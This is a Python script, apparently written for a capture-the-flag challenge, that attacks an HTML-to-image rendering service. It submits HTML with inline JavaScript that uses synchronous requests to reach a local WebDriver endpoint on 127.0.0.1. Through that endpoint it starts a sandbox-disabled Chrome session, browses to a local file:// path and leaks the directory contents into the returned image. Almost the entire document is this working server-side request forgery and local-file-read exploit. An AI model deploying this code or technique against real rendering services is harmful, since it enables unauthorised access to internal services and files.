import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def render(html, name):
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    for _ in range(2):
        try:
            r = s.post(BASE + '/html-to-image', json={'pages': [html]}, timeout=120)
            if r.status_code == 200 and 'zip' in r.headers.get('Content-Type',''):
                z = zipfile.ZipFile(io.BytesIO(r.content))
                for n in z.namelist():
                    with open(f'f:/mission-git-hackss/mission-git-hackss/sy_{name}.jpg','wb') as f: f.write(z.read(n))
                    print(f'{name}: {len(z.read(n))} bytes OK')
                return True
            print(f'{name}: [{r.status_code}] {r.text[:150]}')
            return False
        except Exception as e:
            print('retry',e); time.sleep(2)
    return False

# Synchronous XHR chain - blocks until done, so DOM has result before load event fires.
# Inline script runs during parse (before load), synchronous XHR completes fully.
js = r'''<!doctype html><html><head><style>body{font-family:monospace;font-size:13px;white-space:pre-wrap;word-break:break-all;padding:10px}</style></head><body><div id=o>x</div>
<script>
var out=document.getElementById('o');
function log(m){out.textContent+=m+"\n";}
function req(method,url,body){
  var x=new XMLHttpRequest();
  x.open(method,url,false);
  if(body!==undefined){x.setRequestHeader("Content-Type","application/json");x.send(body);}else{x.send();}
  return x.responseText;
}
var B="http://127.0.0.1:40003";
try{
  var caps=JSON.stringify({capabilities:{alwaysMatch:{browserName:"chrome","goog:chromeOptions":{args:["--headless=new","--no-sandbox","--disable-dev-shm-usage","--disable-gpu"]}}}});
  var sr=req("POST",B+"/session",caps);
  log("SESS:"+sr.substring(0,120));
  var sid=sr.match(/"sessionId"\s*:\s*"([^"]+)"/)[1];
  req("POST",B+"/session/"+sid+"/url",JSON.stringify({url:"file:///runner/"}));
  var src=req("GET",B+"/session/"+sid+"/source");
  log("RUNNER:"+src.substring(0,1500));
  req("DELETE",B+"/session/"+sid);
}catch(e){log("ERR:"+e);}
</script></body></html>'''
render(js, 'sync_runner')
